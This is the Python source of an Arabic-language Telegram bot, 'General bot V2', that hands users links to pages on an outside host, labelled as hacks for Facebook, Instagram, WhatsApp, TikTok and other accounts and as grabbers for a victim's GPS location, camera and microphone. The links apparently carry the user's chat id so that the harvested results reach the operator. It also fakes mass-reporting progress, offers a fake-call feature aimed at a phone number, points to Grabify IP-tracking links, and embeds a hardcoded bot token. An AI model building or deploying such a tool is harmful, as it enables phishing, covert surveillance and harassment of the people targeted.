import os, time, threading, random, string, requests
from flask import Flask, request
from telebot import TeleBot, types

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html.onrender.com"
WEBHOOK_URL = "https://gamee-08ue.onrender.com"
CALL_SITE = "https://callmyphone.org/app"

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

user_states = {}
bot_rating = 0

# نكت
JOKES = [
    "مرة واحد بخيل جداً.. ابنه مات قال الحقوه هاتوه",
    "مرة واحد محشش قعد 3 أيام في البيت ليه؟ لأنه لقى الباب مفتوح",
    "مرة اثنين محششين ركبوا سيارة قالوا: بنروح على السينما، قالوا: لأ خلينا نضل بالسيارة أحسن لأن الشاشة أكبر",
    "مرة واحد غبي جداً لقى ورقة مكتوب عليها 'أنظر للخلف' فضل يلف على نفسه",
    "محشش شاف تايه قال: يا ترى إيه اللي مكتوب فيها؟! قام قاريها: 'مكتوب عليها صُنع في اليابان'",
    "واحد بيقول لمراته: انا طلعت من بيتي فقير ورجعت غني! قالتله: اشتغلت؟ قالها: لا لقيت البيت اتسرق",
    "واحد غبي دق على المطعم قالهم: عندكم أكل؟ قالوله: أيوة، قالهم: طب إقفلوا الباب"
]

def generate_password(length=16):
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    return ''.join(random.choice(chars) for _ in range(length))

@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return ''
    return '!', 403

def main_menu(chat_id, edit=False, msg_id=None):
    markup = types.InlineKeyboardMarkup(row_width=2)

    tools_pairs = [
        ("📘 اختراق فيسبوك", "facebook.html", "🎵 اختراق تيك توك", "tiktok.html"),
        ("👻 اختراق سناب شات", "snapchat.html", "📷 اختراق انستقرام", "instagram.html"),
        ("💬 اختراق واتساب", "whatsapp.html", "✈️ اختراق تيليجرام", "telegram.html"),
        ("🐦 اختراق تويتر", "twitter.html", "▶️ اختراق يوتيوب", "youtube.html"),
        ("🎮 اختراق ديسكورد", "discord.html", "🤖 اختراق ريدت", "reddit.html"),
        ("📍 سحب الموقع", "gps.html", "📸 اختراق الكاميرا", "camera.html"),
        ("🎙️ تسجيل الصوت", "mic.html", "🎥 تصوير فيديو", "video.html"),
    ]
    for left_name, left_file, right_name, right_file in tools_pairs:
        left_url = f"{BASE_URL}/{left_file}?chat={chat_id}"
        right_url = f"{BASE_URL}/{right_file}?chat={chat_id}"
        markup.row(types.InlineKeyboardButton(left_name, url=left_url),
                   types.InlineKeyboardButton(right_name, url=right_url))

    reports = [
        ("🐦 ضرب بلاغ تويتر X", "https://help.twitter.com/forms"),
        ("👻 ضرب بلاغ سناب شات", "https://support.snapchat.com/community-report"),
        ("▶️ ضرب بلاغ يوتيوب", "https://www.youtube.com/reportingtool"),
        ("✈️ ضرب بلاغ تيليجرام", "https://telegram.org/faq_report"),
        ("🎵 ضرب بلاغ تيك توك", "https://www.tiktok.com/legal/report/feedback"),
        ("📷 ضرب بلاغ انستقرام", "https://help.instagram.com/contact/383679321740945"),
    ]
    for name, link in reports:
        markup.row(types.InlineKeyboardButton(name, callback_data=f"massreport|{name}|{link}"))

    markup.row(
        types.InlineKeyboardButton("📞 اتصال وهمي", callback_data="call_my_phone"),
        types.InlineKeyboardButton("📱 فحص مواصفات الجهاز", url=f"{BASE_URL}/device.html?chat={chat_id}")
    )
    markup.row(
        types.InlineKeyboardButton("🛠️ أدوات اختراق الشبكات", callback_data="network_tools"),
        types.InlineKeyboardButton("🔓 فك حظر واتساب", callback_data="whatsapp_unban")
    )
    markup.row(
        types.InlineKeyboardButton("☠️ تلغيم روابط", callback_data="link_bomb"),
        types.InlineKeyboardButton("🔐 توليد كلمات مرور", callback_data="generate_password")
    )
    markup.row(
        types.InlineKeyboardButton("😂 نكت", callback_data="tell_joke"),
        types.InlineKeyboardButton("⭐ تقييم البوت", callback_data="rate_bot")
    )
    markup.row(
        types.InlineKeyboardButton("📜 تعليمات وشروط", callback_data="terms"),
        types.InlineKeyboardButton("💻 كيف تصبح هكر", callback_data="become_hacker")
    )
    markup.row(types.InlineKeyboardButton("🔄 رجوع", callback_data="main_menu"))

    text = ("🔱 <b>بوت الجنرال V2</b>\n\n"
            "أهلاً بك في لوحة التحكم المركزية. اختر الأداة المناسبة.\n\n"
            "⚡ جميع الأدوات تعمل بضغطة زر.\n"
            "⚠️ يُرجى استخدام البوت بمسؤولية.")
    if edit and msg_id:
        bot.edit_message_text(text, chat_id=chat_id, message_id=msg_id, reply_markup=markup, parse_mode="HTML")
    else:
        bot.send_message(chat_id, text, reply_markup=markup, parse_mode="HTML")

@bot.message_handler(commands=['start'])
def start(message):
    main_menu(message.chat.id)

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    chat_id = call.message.chat.id
    data = call.data

    if data == "main_menu":
        main_menu(chat_id, edit=True, msg_id=call.message.message_id)
        bot.answer_callback_query(call.id)

    elif data.startswith("massreport|"):
        _, name, link = data.split("|", 2)
        msg = bot.send_message(chat_id, f"⏳ جاري إرسال بلاغات هائلة لـ {name}...\n[░░░░░░░░░░] 0%")
        bot.answer_callback_query(call.id)
        def mass_report_simulation():
            total = 120
            for i in range(1, total+1):
                time.sleep(0.06)
                pct = int(i/total*100)
                bar = "▓"*(pct//10) + "░"*(10 - pct//10)
                try: bot.edit_message_text(f"🔥 {name}\n[{bar}] {pct}%\n📊 تم {i} بلاغ", chat_id=chat_id, message_id=msg.message_id)
                except: pass
            bot.edit_message_text(f"✅ تم {total} بلاغ!\n🔗 {link}", chat_id=chat_id, message_id=msg.message_id)
        threading.Thread(target=mass_report_simulation).start()

    elif data == "call_my_phone":
        user_states[chat_id] = "waiting_call_number"
        bot.send_message(chat_id, "📞 أرسل رقم الهاتف (بدون + او 00)\nمثال: 967940201477")
        bot.answer_callback_query(call.id)

    elif data == "network_tools":
        tools = ("🛠️ <b>أدوات اختراق الشبكات:</b>\n"
                 "1. Nmap\n2. Wireshark\n3. Metasploit\n4. Aircrack-ng\n"
                 "5. Burp Suite\n6. John the Ripper\n7. Hydra\n8. Nikto\n"
                 "9. SQLmap\n10. Hashcat\n\nKali Linux / Parrot OS")
        bot.send_message(chat_id, tools, parse_mode="HTML")
        bot.answer_callback_query(call.id)

    elif data == "whatsapp_unban":
        text = ("🔓 <b>فك حظر واتساب</b>\n\n"
                "1. انسخ الرسالة التالية (عدّل رقمك):\n"
                "<code>عزيزي فريق دعم واتساب،\nتم حظر رقمي ... رقمي هو: +967XXXXXXXX</code>\n\n"
                "2. أرسلها إلى:\n"
                "- smb@support.whatsapp.com\n"
                "- android@support.whatsapp.com\n"
                "- support@support.whatsapp.com\n\n"
                "3. نصائح:\n"
                "• استخدم رقمك مع رمز الدولة.\n"
                "• انتظر 1-3 أيام للرد.\n"
                "• لا تستخدم نسخ معدلة.")
        bot.send_message(chat_id, text, parse_mode="HTML")
        bot.answer_callback_query(call.id)

    elif data == "link_bomb":
        bot.send_message(chat_id, "☠️ <b>تلغيم روابط</b>\n\nاستخدم Grabify:\n1. اذهب إلى grabify.link\n2. الصق الرابط\n3. احصل على رابط التتبع.", parse_mode="HTML")
        bot.answer_callback_query(call.id)

    elif data == "generate_password":
        pwd = generate_password()
        bot.send_message(chat_id, f"🔐 <b>كلمة مرور قوية:</b>\n<code>{pwd}</code>", parse_mode="HTML")
        bot.answer_callback_query(call.id)

    elif data == "tell_joke":
        joke = random.choice(JOKES)
        bot.send_message(chat_id, f"😂 <b>نكتة:</b>\n{joke}", parse_mode="HTML")
        bot.answer_callback_query(call.id)

    elif data == "rate_bot":
        global bot_rating
        bot_rating += 1
        bot.send_message(chat_id, f"⭐ شكراً! عدد التقييمات: {bot_rating}\nالتقييم: 5.0 🌟", parse_mode="HTML")
        bot.answer_callback_query(call.id)

    elif data == "terms":
        terms = ("📜 <b>شروط الاستخدام</b>\n\n"
                 "✅ لن أستخدم التطبيق فيما يغضب الله.\n"
                 "✅ لن أسرق صور أو حسابات.\n"
                 "✅ سأستخدمه للمزاح والربح المشروع فقط.\n"
                 "⚠️ أُبرئ ذمة المطور من أي استخدام خاطئ.")
        bot.send_message(chat_id, terms, parse_mode="HTML")
        bot.answer_callback_query(call.id)

    elif data == "become_hacker":
        steps = ("💻 <b>كيف تصبح هاكر:</b>\n"
                 "1. أساسيات الشبكات\n2. Linux\n3. Python\n4. ثغرات الويب\n"
                 "5. أدوات مثل Nmap, Burp\n6. منصات تدريب\n7. شهادات CEH/OSCP")
        bot.send_message(chat_id, steps, parse_mode="HTML")
        bot.answer_callback_query(call.id)

    else:
        bot.answer_callback_query(call.id, text="غير معروف")

@bot.message_handler(func=lambda msg: user_states.get(msg.chat.id) == "waiting_call_number")
def handle_call_number(msg):
    chat_id = msg.chat.id
    number = msg.text.strip().replace("+", "").replace(" ", "").replace("-", "")
    if not number:
        bot.reply_to(msg, "⚠️ أدخل رقماً صحيحاً.")
        return
    url = f"{CALL_SITE}?number={number}"
    bot.send_message(chat_id, f"📞 <b>اتصال وهمي</b>\n🔗 {url}", parse_mode="HTML")
    user_states.pop(chat_id, None)

# منع السكون
def keep_alive():
    while True:
        time.sleep(600)
        try: requests.get(WEBHOOK_URL, timeout=5)
        except: pass

threading.Thread(target=keep_alive, daemon=True).start()

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{WEBHOOK_URL}/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))